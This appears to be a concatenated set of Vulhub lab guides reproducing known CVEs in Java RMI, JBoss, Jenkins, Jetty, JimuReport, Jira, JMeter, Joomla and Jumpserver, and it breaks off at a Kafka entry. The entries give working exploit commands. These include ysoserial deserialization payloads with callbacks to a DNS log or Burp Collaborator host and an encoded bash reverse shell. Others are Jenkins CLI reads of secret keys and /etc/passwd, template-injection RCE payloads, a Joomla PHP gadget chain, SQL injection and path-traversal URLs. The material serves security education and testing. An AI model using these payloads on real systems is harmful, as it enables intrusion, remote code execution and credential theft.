Java Remote Method Invocation (RMI) is used for remote procedure calls in Java. Although remote binding is typically disabled, RMI Registry contains a remote binding functionality that can be exploited. By forging serialized data (implementing the Remote interface or dynamically proxying objects that implement the Remote interface) during the binding process, an attacker can trigger a deserialization vulnerability in the Registry when it processes the data. This environment uses commons-collections:3.2.1 for demonstration.

References:
<https://www.rapid7.com/db/modules/exploit/multi/misc/javarmiserver
<https://github.com/frohoff/ysoserial

Environment Setup

Execute the following commands to compile and start the RMI Registry and server:


docker compose build
docker compose run -e RMIIP=your-ip -p 1099:1099 rmi


Replace your-ip with your server's IP address. The client will use this IP to connect to the server.

After startup, the RMI Registry will be listening on port 1099.

Vulnerability Reproduction

Use the RMIRegistryExploit from ysoserial's exploit package to perform the attack:

bash
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 ""curl your-dnslog-server""




The Registry will return an error, but this is normal and the command will still execute successfully.
-------------------------------------------------------------------------------","https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server
https://github.com/frohoff/ysoserial"
java,Unknown,Java < JDK8u232_b09 RMI Registry Deserialization Remote Code Execution Bypass,"Java < JDK8u232_b09 RMI Registry Deserialization Remote Code Execution Bypass

中文版本(Chinese version)

Java Remote Method Invocation (RMI) is used for remote procedure calls in Java. Although remote binding is typically disabled, RMI Registry contains a remote binding functionality that can be exploited. By forging serialized data (implementing the Remote interface or dynamically proxying objects that implement the Remote interface) during the binding process, an attacker can trigger a deserialization vulnerability in the Registry when it processes the data.

Since JDK 8u121, the Registry implements a whitelist restriction for deserialized classes:

java
if (String.class == clazz
        || java.lang.Number.class.isAssignableFrom(clazz)
        || Remote.class.isAssignableFrom(clazz)
        || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
        || UnicastRef.class.isAssignableFrom(clazz)
        || RMIClientSocketFactory.class.isAssignableFrom(clazz)
        || RMIServerSocketFactory.class.isAssignableFrom(clazz)
        || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)
        || java.rmi.server.UID.class.isAssignableFrom(clazz)) {
    return ObjectInputFilter.Status.ALLOWED;
} else {
    return ObjectInputFilter.Status.REJECTED;
}


We need to find exploitable classes within these whitelisted classes. For more details, see A Discussion on RMI Registry Deserialization Issues, this article introduces the bypass methods that use JRMPListener to bypass the whitelist restriction.

References:
<https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/
<https://github.com/wh1t3p1g/ysoserial

Environment Setup

Execute the following commands to compile and start the RMI Registry and server:


docker compose build
docker compose run -e RMIIP=your-ip -p 1099:1099 rmi


Replace your-ip with your server's IP address. The client will use this IP to connect to the server.

After startup, the RMI Registry will be listening on port 1099.

Vulnerability Reproduction

Use RMIRegistryExploit2 or RMIRegistryExploit3 from ysoserial's exploit package to perform the attack:

bash
Start JRMPListener
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 ""curl http://xxxxx.burpcollaborator.net""
Launch the attack
java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit2 192.168.31.88 1099 jrmphost 8888




The Registry will return an error, but this is normal and the command will still execute successfully.
-------------------------------------------------------------------------------","https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/
https://github.com/wh1t3p1g/ysoserial
http://xxxxx.burpcollaborator.net"""
jboss,CVE-2017-12149,JBoss 5.x/6.x Deserialization Remote Code Execution (CVE-2017-12149),"JBoss 5.x/6.x Deserialization Remote Code Execution (CVE-2017-12149)

中文版本(Chinese version)

Red Hat JBoss Application Server is a JavaEE-based open source application server. In JBoss AS 5.x/6.x, the ReadOnlyAccessFilter filter in the HttpInvoker component attempts to deserialize data streams from clients without performing any security checks, resulting in a deserialization vulnerability.

References:
https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg
https://access.redhat.com/security/cve/cve-2017-12149

Environment Setup

Run the following command to start the JBoss AS 6.1.0:


docker compose up -d


The initial setup will take 1-3 minutes. After initialization is complete, visit http://your-ip:8080/ to see the JBoss default page.

Vulnerability Reproduce

The vulnerability exists in the /invoker/readonly request, where the server performs Java deserialization on the POST content submitted by users:



Therefore, we can use conventional Java deserialization vulnerability testing methods to reproduce this vulnerability.

Generate reverse shell payload

We use bash for the reverse shell, but since Runtime.getRuntime().exec() cannot use pipe operators and other bash methods directly, we need to encode it first.

Tool: http://www.jackson-t.ca/runtime-exec-payloads.html



Generate serialized data

We use ysoserial to generate the serialized data. Since Vulhub uses a newer version of Java, we choose the CommonsCollections5 gadget:


java -jar ysoserial.jar CommonsCollections5 ""bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx}|{base64,-d}|{bash,-i}"" poc.ser


Send the POC

The generated POC is poc.ser. Simply send this file as the POST Body to /invoker/readonly:



Successfully obtained reverse shell:
-------------------------------------------------------------------------------","https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg
https://access.redhat.com/security/cve/cve-2017-12149
http://www.jackson-t.ca/runtime-exec-payloads.html"
jboss,Unknown,JBoss JMXInvokerServlet Deserialization Remote Code Execution,"JBoss JMXInvokerServlet Deserialization Remote Code Execution

中文版本(Chinese version)

Red Hat JBoss Application Server is a JavaEE-based open source application server.

This is a classic JBoss deserialization vulnerability where JBoss reads user-supplied objects in the /invoker/JMXInvokerServlet request, allowing attackers to execute arbitrary code using Gadgets from Apache Commons Collections.

References:
https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
https://www.seebug.org/vuldb/ssvid-89723
http://www.freebuf.com/sectool/88908.html
https://paper.seebug.org/312/

Environment Setup

Execute the following command to start JBoss AS 6.1.0:


docker compose up -d


The initial setup will take 1-3 minutes. After initialization is complete, visit http://your-ip:8080/ to see the JBoss default page.

Vulnerability Reproduce

When JBoss processes the /invoker/JMXInvokerServlet request, it reads the object directly. Therefore, we can simply attach a POC generated by ysoserial in the POST Body. The entire process is similar to jboss/CVE-2017-12149, so I won't repeat it here.

There are many existing exploits available online. For example, you can use DeserializeExploit.jar to directly execute commands and upload files:
-------------------------------------------------------------------------------","https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
https://www.seebug.org/vuldb/ssvid-89723
http://www.freebuf.com/sectool/88908.html
https://paper.seebug.org/312/"
jboss,CVE-2017-7504,JBoss 4.x JBossMQ JMS Deserialization Remote Code Execution (CVE-2017-7504),"JBoss 4.x JBossMQ JMS Deserialization Remote Code Execution (CVE-2017-7504)

中文版本(Chinese version)

Red Hat JBoss Application Server is a JavaEE-based open source application server. In JBoss AS 4.x and earlier versions, there is a deserialization vulnerability in the HTTPServerILServlet.java file of the JMS over HTTP Invocation Layer in JBossMQ implementation. Remote attackers can exploit this vulnerability to execute arbitrary code by using specially crafted serialized data.

References:
https://github.com/joaomatosf/JavaDeserH2HC
https://www.youtube.com/watch?v=jVMr4eeJ2Po

Environment Setup

Execute the following command to start JBoss AS 4.0.5:


docker compose up -d


After the environment is started, the target will be available at http://your-ip:8080.

Vulnerability Reproduce

This vulnerability exists in the /jbossmq-httpil/HTTPServerILServlet request. We can use the CommonsCollections5 exploitation chain from ysoserial to reproduce it. Generate the payload:


java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 ""touch /tmp/success"" 1.ser


Send the content of 1.ser file as POST Body:


curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser




Execute docker compose exec jboss bash to enter the container, and you can see that /tmp/success has been successfully created.
-------------------------------------------------------------------------------","https://github.com/joaomatosf/JavaDeserH2HC
https://www.youtube.com/watch?v=jVMr4eeJ2Po
http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet"
jenkins,CVE-2024-23897,Jenkins Arbitrary File Read Through the CLI (CVE-2024-23897),"Jenkins Arbitrary File Read Through the CLI (CVE-2024-23897)

中文版本(Chinese version)

Jenkins is an open source automation server.

Jenkins uses the args4j library to parse command arguments and options on the Jenkins controller when processing CLI commands. This command parser has a feature that replaces an @ character followed by a file path in an argument with the file’s contents (expandAtFiles), which leads attackers to read arbitrary files from Jenkins server.

This vulnerability affects Jenkins prior to 2.441.

References:
<https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314
<https://mp.weixin.qq.com/s/2a4NXRkrXBDhcL9gZ3XQyw

Vulnerable Environment

Execute following command to start a Jenkins server 2.441:


docker compose up -d


You can access the Jenkins server through http://your-ip:8080/ after the server is started. Default administrator's username and password are admin and vulhub.

Exploit

First, you should download the command-line client jenkins-cli.jar by http://localhost:8080/jnlpJars/jenkins-cli.jar.

Read the file /proc/self/environ to get the Jenkins base directory, JENKINSHOME=/var/jenkinshome:


java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 ""@/proc/self/environ""




Then, you can use it to retrieve sensitive files such as secrets.key or master.key (anonymously, only the first line of the file can be read via an error on the command line):


java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 ""@/var/jenkins_home/secret.key""





java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 ""@/var/jenkins_home/secrets/master.key""




Because the ""Allow anonymous read access"" is turned on, you can also read the full content of a file:


java -jar jenkins-cli.jar -s http://localhost:8080/ -http connect-node ""@/etc/passwd""
-------------------------------------------------------------------------------","https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314
https://mp.weixin.qq.com/s/2a4NXRkrXBDhcL9gZ3XQyw
http://localhost:8080/
http://localhost:8080/
http://localhost:8080/
http://localhost:8080/"
jenkins,CVE-2018-1000861,Jenkins Remote Code Execution (CVE-2018-1000861),"Jenkins Remote Code Execution (CVE-2018-1000861)

中文版本(Chinese version)

Jenkins is a popular open-source automation server.

A code execution vulnerability exists in the Stapler web framework used by Jenkins 2.153 and earlier, LTS 2.138.3 and earlier. In stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java, attackers can invoke some methods on Java objects by accessing crafted URLs that were not intended to be invoked this way.

Through this vulnerability, multiple exploit chains can be discovered. The most severe one allows unauthenticated users to execute arbitrary commands by bypassing the Groovy sandbox: Before Jenkins executes Groovy scripts in the sandbox, it first checks for syntax errors. This checking process occurs outside the sandbox, allowing attackers to execute arbitrary commands through Meta-Programming during this validation step.

References:
http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html
http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html
https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html

Environment Setup

Execute the following command to start Jenkins 2.138 with the vulnerable plugins pre-installed:


docker compose up -d


After the server is fully started, visit http://your-ip:8080 to access Jenkins. No manual installation is required.

Vulnerability Reproduction

Using @orangetw's one-click POC script, you can execute commands by sending the following request:


http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript
?sandbox=true
&value=public class x {
  public x(){
    ""touch /tmp/success"".execute()
  }
}




The successful creation of /tmp/success confirms the remote code execution:
-------------------------------------------------------------------------------","http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html
http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html
https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html"
jenkins,CVE-2017-1000353,Jenkins Remote Code Execution (CVE-2017-1000353),"Jenkins Remote Code Execution (CVE-2017-1000353)

中文版本(Chinese version)

Jenkins is a popular open-source automation server.

Jenkins versions 2.56 and earlier as well as 2.46.1 LTS and earlier are vulnerable to an unauthenticated remote code execution. An unauthenticated remote code execution vulnerability allowed attackers to transfer a serialized Java SignedObject object to the Jenkins CLI, that would be deserialized using a new ObjectInputStream, bypassing the existing blacklist-based protection mechanism.

References:
<https://www.jenkins.io/security/advisory/2017-04-26/
<https://www.exploit-db.com/exploits/41965

Environment Setup

Execute the following command to start Jenkins 2.46.1:


docker compose up -d


After the server is fully started, visit http://your-ip:8080 to access Jenkins. No manual installation is required.

Vulnerability Reproduction

The exploitation process involves two steps: generating a malicious serialized payload and sending it to the target Jenkins server.

First, download the CVE-2017-1000353-1.1-SNAPSHOT-all.jar tool to generate the payload. This tool will create a serialized object containing our command:

bash
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser ""touch /tmp/success""
jenkins_poc.ser is the output file name
""touch ..."" is the command to be executed


Note: The Java version used for payload generation is crucial. OpenJDK 8u292 is recommended, as other Java versions might not generate a working payload. If you encounter issues, you can use the following command to generate the payload using Docker:

bash
docker run --rm -v $(pwd):/tmp openjdk:8u292 bash -c ""cd /tmp && java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser \""touch /tmp/success\""""


After execution, a file named jenkins_poc.ser will be generated containing the serialized payload.

Next, download the exploit.py script and execute it with Python 3 to send the payload:

bash
python exploit.py http://your-ip:8080 jenkins_poc.ser




To verify the successful exploitation, check inside the container for the created file:



The presence of /tmp/success file confirms that the remote code execution was successful.
-------------------------------------------------------------------------------","https://www.jenkins.io/security/advisory/2017-04-26/
https://www.exploit-db.com/exploits/41965
http://your-ip:8080"
jetty,CVE-2021-28164,Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-28164),"Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-28164)

中文版本(Chinese version)

Eclipse Jetty is a Java web server and Java Servlet container.

Jetty release 9.4.37 introduced a more precise implementation of RFC3986 with regards to URI decoding, together with some new compliance modes to optionally allow support of some URI that may have ambiguous interpretation within the Servlet specified API methods behaviours. The default mode allowed % encoded . characters to be excluded for URI normalisation, which is correct by the RFC, but is not assumed by common Servlet implementations.

The default compliance mode allows requests with URIs that contain %2e or %2e%2e segments to access protected resources within the WEB-INF directory. For example a request to /context/%2e/WEB-INF/web.xml can retrieve the web.xml file. This can reveal sensitive information regarding the implementation of a web application.

This bug is fixed on version 9.4.39.

Reference links.
https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5
https://xz.aliyun.com/t/10039

Vulnerable Application

Execute the following command to start a Jetty 9.4.37 server.


docker compose up -d


After the server starts, visit http://your-ip:8080 to see an example page.

Exploit

The sensitive file web.xml is not accessible through /WEB-INF/web.xml.



Use %2e/ to bypass the restriction:


curl -v 'http://192.168.1.162:8080/%2e/WEB-INF/web.xml'
-------------------------------------------------------------------------------","https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5
https://xz.aliyun.com/t/10039"
jetty,CVE-2021-34429,Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-34429),"Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-34429)

中文版本(Chinese version)

Eclipse Jetty is a Java web server and Java Servlet container.

Jetty 9.4.40 fixed an ambiguous paths information disclosure vulnerability CVE-2021-28164, CVE-2021-34429 is a variation and bypass of it.

There are 3 types of payload that exfiltrate the content of WEB-INF/web.xml:
Unicode based URL encoded: /%u002e/WEB-INF/web.xml
\0 with . bug:  /.%00/WEB-INF/web.xml
\0 with .. bug: /a/b/..%00/WEB-INF/web.xml

The vulnerability affects the Jetty 9.4.37-9.4.42, 10.0.1-10.0.5, 11.0.1-11.0.5.

References:
https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm
https://xz.aliyun.com/t/10039

Vulnerable Application

Execute the following command to start a Jetty 9.4.40 server.


docker compose up -d


After the server starts, visit http://your-ip:8080 to see an example page.

Exploit

The sensitive file web.xml is not accessible through /WEB-INF/web.xml.



Use payload /%u002e/WEB-INF/web.xml to bypass the restriction:
-------------------------------------------------------------------------------","https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm
https://xz.aliyun.com/t/10039"
jetty,CVE-2021-28169,Jetty Utility Servlets ConcatServlet Double Decoding Information Disclosure Vulnerability (CVE-2021-28169),"Jetty Utility Servlets ConcatServlet Double Decoding Information Disclosure Vulnerability (CVE-2021-28169)

中文版本(Chinese version)

Eclipse Jetty is a Java web server and Java Servlet container.

Before version 9.4.40, 10.0.2, 11.0.2, the ConcatServlet and WelcomeFilter classes in Jetty Servlets are influenced by a double decoding bug. If developers use these two classes manually, attackers can use them to download arbitrary sensitive files in the WEB-INF directory.

Reference links.
https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq

Vulnerable Application

Execute the following command to start a Jetty 9.4.40 server.


docker compose up -d


After the server starts, visit http://your-ip:8080 to see an example page. This page uses the ConcatServlet to optimize the loading of static files:


<link rel=""stylesheet"" href=""/static?/css/base.css&/css/app.css""


Exploit

The sensitive file web.xml is not accessible through /static?/WEB-INF/web.xml.



Double URL encoding W to bypass the restriction:


curl -v 'http://your-ip:8080/static?/%2557EB-INF/web.xml'
-------------------------------------------------------------------------------",https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq
jimureport,CVE-2023-4450,JeecgBoot JimuReport FreeMarker Server Side Template Injection RCE (CVE-2023-4450),"JeecgBoot JimuReport FreeMarker Server Side Template Injection RCE (CVE-2023-4450)

中文版本(Chinese version)

JimuReport is a open source visualization report platform under JeecgBoot project. In the JimuReport version prior to 1.6.0, there is a FreeMarker server side template injection (SSTI) issue that is able to execute arbitrary commands.

References:
<https://github.com/advisories/GHSA-j8h5-8rrr-m6j9
<https://whoopsunix.com/docs/java/named%20module/
<https://www.reajason.eu.org/writing/freemarkersstimemshell/

Vulnerable Environment

Execute following command to start a JimuReport 1.6.0 server:


docker compose up -d


Wait a few seconds and you can see the index page of JimuReport on http://your-ip:8085.

Exploit

Send the following request to execute the FreeMarker template <#assign ex=""freemarker.template.utility.Execute""?new()${ex(""id"")}:


POST /jmreport/queryFieldBySql HTTP/1.1
Host: localhost:8085
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 100

{""sql"":""select 'result:<#assign ex=\""freemarker.template.utility.Execute\""?new()${ex(\""id\"")}'"" }


The id command has been executed successfully:
-------------------------------------------------------------------------------","https://github.com/advisories/GHSA-j8h5-8rrr-m6j9
https://whoopsunix.com/docs/java/named%20module/
https://www.reajason.eu.org/writing/freemarkersstimemshell/"
jira,CVE-2019-11581,Atlassian Jira Template Injection (CVE-2019-11581),"Atlassian Jira Template Injection (CVE-2019-11581)

中文版本(Chinese version)

Atlassian Jira is a widely used project and issue tracking tool in enterprises, commonly applied in defect tracking, customer service, requirements collection, process approval, task tracking, project tracking, and agile management. A template injection vulnerability was discovered in multiple versions that allows remote code execution.

Affected versions include:
4.4.x
5.x.x
6.x.x
7.0.x - 7.13.x (Fixed in 7.6.14, 7.13.5)
8.0.x - 8.2.x (Fixed in 8.0.3, 8.1.2, 8.2.3)

References:
<https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html
<https://jira.atlassian.com/browse/JRASERVER-69532
<https://mp.weixin.qq.com/s/d2yvSyRZXpZrPcAkMqArsw

Environment Setup

Execute the following command to start Jira Server 8.1.0:


docker compose up -d


After the server starts, visit http://your-ip:8080 to begin the installation process:

1. Switch to your preferred language
2. Choose ""Set it up for me"" (first option)
3. Apply for a Jira Server test license from Atlassian (do not select Data Center or Addons)
4. Complete the installation process

Note: Installation may fail or take longer on machines with limited memory. It's recommended to use a machine with at least 4GB of RAM.



Add SMTP mail server at /secure/admin/AddSmtpMailServer!default.jspa:



Enable ""Contact Administrators Form"" in System Settings at /secure/admin/ViewApplicationProperties.jspa:



Create a sample project to complete the setup.

Vulnerability Reproduction

The PoC is similar to CVE-2019-3396. You can use the following payload:


$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami').toString()


You can either:

1. Run poc.py, or
2. Submit the PoC directly at /secure/ContactAdministrators!default.jspa





If you don't see any data in smtpd, check the email queue at /secure/admin/MailQueueAdmin!default.jspa:
-------------------------------------------------------------------------------","https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html
https://jira.atlassian.com/browse/JRASERVER-69532
https://mp.weixin.qq.com/s/d2yvSyRZXpZrPcAkMqArsw"
jmeter,CVE-2018-1297,Apache JMeter RMI Deserialization Remote Code Execution (CVE-2018-1297),"Apache JMeter RMI Deserialization Remote Code Execution (CVE-2018-1297)

中文版本(Chinese version)

Apache JMeter is an Apache project that can be used as a load testing tool for analyzing and measuring the performance of a variety of services, with a focus on web applications.

When using Distributed Test only (RMI based), Apache JMeter 2.x and 3.x uses an unsecured RMI connection. This could allow an attacker to get Access to JMeterEngine and send unauthorized code.

Vulnerable environment

Execute following command to start a JMeter v3.3 RMI server:


docker compose up -d


After the server is started, the RMI is listening on port 1099.

Exploit

Use ysoserial to exploit the deserialization by the gadget BeanShell1:


java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 BeanShell1 'touch /tmp/success'


Execute docker compose exec jmeter bash to enter the container, you will see the /tmp/success has been created:



Get a reverse shell:
-------------------------------------------------------------------------------",
joomla,CVE-2015-8562,Joomla HTTP Header Unauthenticated Remote Code Execution (CVE-2015-8562),"Joomla HTTP Header Unauthenticated Remote Code Execution (CVE-2015-8562)

中文版本(Chinese version)

Joomla is a free and open-source content management system (CMS) that allows users to build websites and online applications. It was first released in 2005 and has since become one of the most popular CMS platforms, powering millions of websites around the world.

Joomla suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5. By storing user supplied headers in the databases session table it's possible to truncate the input by sending an 4-bytes UTF-8 character. The custom created payload is then executed once the session is read from the database. You also need to have a PHP version before 5.4.45 (including 5.3.x), 5.5.29 or 5.6.13.

References:
<https://packetstormsecurity.com/files/134949/Joomla-HTTP-Header-Unauthenticated-Remote-Code-Execution.html
<https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html

Vulnerable Environment

Executing following command to start a Joomla 3.4.5:


docker compose up -d


After the server is started, you can see the home page of it at http://your-ip:8080.

Exploit

First of all, you need to send a request without User-Agent header and remember the Cookie in the response:



Then use this script to generate a payload (execute online):

php
<?php
class JSimplepieFactory {
}
class JDatabaseDriverMysql {

}
class SimplePie {
    var $sanitize;
    var $cache;
    var $cachenamefunction;
    var $javascript;
    var $feed_url;
    function construct()
    {
        $this-feed_url = ""phpinfo();JFactory::getConfig();exit;"";
        $this-javascript = 9999;
        $this-cachenamefunction = ""assert"";
        $this-sanitize = new JDatabaseDriverMysql();
        $this-cache = true;
    }
}

class JDatabaseDriverMysqli {
    protected $a;
    protected $disconnectHandlers;
    protected $connection;
    function construct()
    {
        $this-a = new JSimplepieFactory();
        $x = new SimplePie();
        $this-connection = 1;
        $this-disconnectHandlers = [
            [$x, ""init""],
        ];
    }
}

$a = new JDatabaseDriverMysqli();
$poc = serialize($a); 

$poc = str_replace(""\x00*\x00"", '\\0\\0\\0', $poc);

echo ""123}test|{$poc}\xF0\x9D\x8C\x86"";




Put this craft payload into User-Agent header with Cookie obtained earlier then send request again. As you can see, our code phpinfo() is executed:
-------------------------------------------------------------------------------","https://packetstormsecurity.com/files/134949/Joomla-HTTP-Header-Unauthenticated-Remote-Code-Execution.html
https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html"
joomla,CVE-2017-8917,Joomla 3.7.0 com_fields SQL Injection Vulnerability (CVE-2017-8917),"Joomla 3.7.0 com_fields SQL Injection Vulnerability (CVE-2017-8917)

中文版本(Chinese version)

Joomla is a free and open-source content management system (CMS) that allows users to build websites and online applications. It was first released in 2005 and has since become one of the most popular CMS platforms, powering millions of websites around the world.

An SQL injection vulnerability is caused by a new component, com_fields, which was introduced in version 3.7.

References:
<https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html
<https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html

Vulnerable environment

Executing following command to start a Joomla 3.4.5:


docker compose up -d


After the server is started, you can see the home page of it at http://your-ip:8080.

Exploit

Visit following link directly to reproduce the SQL injection attack:


http://your-ip:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)
-------------------------------------------------------------------------------","https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html
https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html"
joomla,CVE-2023-23752,Joomla improper access check in webservice endpoints (CVE-2023-23752),"Joomla improper access check in webservice endpoints (CVE-2023-23752)

中文版本(Chinese version)

Joomla is a free and open-source content management system (CMS) that allows users to build websites and online applications. It was first released in 2005 and has since become one of the most popular CMS platforms, powering millions of websites around the world.

An issue was discovered in Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints.

References:
<https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
<https://xz.aliyun.com/t/12175
<https://vulncheck.com/blog/joomla-for-rce

Vulnerable Environment

Execute following command to start a Joomla site 4.2.7:


docker compose up -d


You can access the Joomla website through http://your-ip:8080 after the server is started.

Exploit

This issue is caused by an attribute overwrite issue, the attacker can use public=true to bypass the authorization check.

For example, expose all configuration including MySQL username and password through this link:


http://your-ip:8080/api/index.php/v1/config/application?public=true




Otherwise access is unauthorized without public=true：



Expose all users information including emails through this link:


http://your-ip:8080/api/index.php/v1/users?public=true
-------------------------------------------------------------------------------","https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
https://xz.aliyun.com/t/12175
https://vulncheck.com/blog/joomla-for-rce"
jumpserver,CVE-2023-42820,Jumpserver random seed leakage and account takeover (CVE-2023-42820),"Jumpserver random seed leakage and account takeover (CVE-2023-42820)

中文版本(Chinese version)

Jumpserver is a Popular Open Source PAM (Privileged Access Management) system that provides web-based SSH (Secure Shell) and RDP (Remote Desktop Protocol) gateway.

In the version prior to 3.6.4 is affected by a high severity vulnerability. This vulnerability is due to a third-party library django-simple-captcha exposing the random number seed to the API, potentially allowing the randomly generated verification codes to be replayed, which could lead to password resets.

References:
<https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp
<https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw
<!-- - <https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html--

Vulnerable environment

Before starting the server, change the value of DOMAINS in config.env to your IP and port, e.g. DOMAINS=your-ip:8080.

Execute following command to start a Jumpserver v3.6.3:


docker compose up -d


After waiting for a while, open http://your-ip:8080 to see the Jumpserver login page.

Vulnerability reproduce

I wrote a fairly straightforward semi-automated script to reproduce this vulnerability. Since it's semi-automated, it's crucial to follow the steps below meticulously to reproduce it accurately.

Firstly, open the 'Forgot Password' page in the tab #1 of your browser: http://your-ip:8080/core/auth/password/forget/previewing/. At this point, there will be a captcha displayed on the page.
If the captcha includes the number ""10"", refresh it, as our script currently can't handle it
If the captcha doesn't include the number ""10"", proceed to open this captcha in a new tab (tab #2)

The captcha image's URL must contain a SHA1 hash like http://your-ip:8080/core/auth/captcha/image/87b2723d404657c2294abfab908975ebb9da5468/, copy the hash as seed and we will use it later.

Return to the tab #1 and refresh the page. The purpose of refreshing is to not use the captcha containing the seed as this seed will be utilized in the subsequent steps.

After refreshing the page, correctly fill in the username and new captcha and submit it. You will be redirected to the captcha verification page.

The URL of this page should like http://localhost:8080/core/auth/password/forgot/?token=sceOx7yWuAH9wWcuzc0nMQmLBzEPNhkhuTfl, containing a random token value. Record this value as the token.

Use our POC:


python poc.py -t http://localhost:8080 --email admin@mycomany.com --seed [seed] --token [token]


This script requires 4 parameters:
-t The target Jumpserver server URL
--email The email address of the user to takeover (In vulhub is admin@mycomany.com)
--seed The pseudorandom number seed noted earlier
--token The token noted earlier

Upon the execution of the script, the predicted code value will be displayed:



Return to your browser, enter this code and submit it. You will then be directed to the new password modification page; change the password accordingly.

For the complete reproduction process, please refer to the following this gif:
-------------------------------------------------------------------------------","https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp
https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw
https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html
http://localhost:8080"
jupyter,Unknown,Jupyter Notebook Unauthorized Access,"Jupyter Notebook Unauthorized Access

中文版本(Chinese version)

The Jupyter Notebook (previous IPython notebook) is a web-based interactive computing platform.

If the administrator doesn't configure a password for Jupyter Notebook, this will lead to an unauthorized access vulnerability where attackers can create a console and execute arbitrary Python code and commands.

Vulnerable environment

Execute following command to start a Jupyter Notebook server:


docker compose up -d


After the server is started, you can see the index of Jupyter Notebook on http://your-ip:8888.

Vulnerability Reproduce

Click ""New"" -""Terminal"" to create a console:



Execute arbitrary commands in this console:
-------------------------------------------------------------------------------",
kafka,CVE-2023-25194,Apache Kafka Clients JNDI injection RCE (CVE-2023-25194),"Apache Kafka Clients JNDI injection RCE (CVE-2023-25194)

中文版本(Chinese version)

Apache Kafka is an open-source distributed event streaming platform that is used for real-time data streaming and processing. Kafka clients are a set of Java libraries that allow you to produce and consume messages from Apache Kafka.

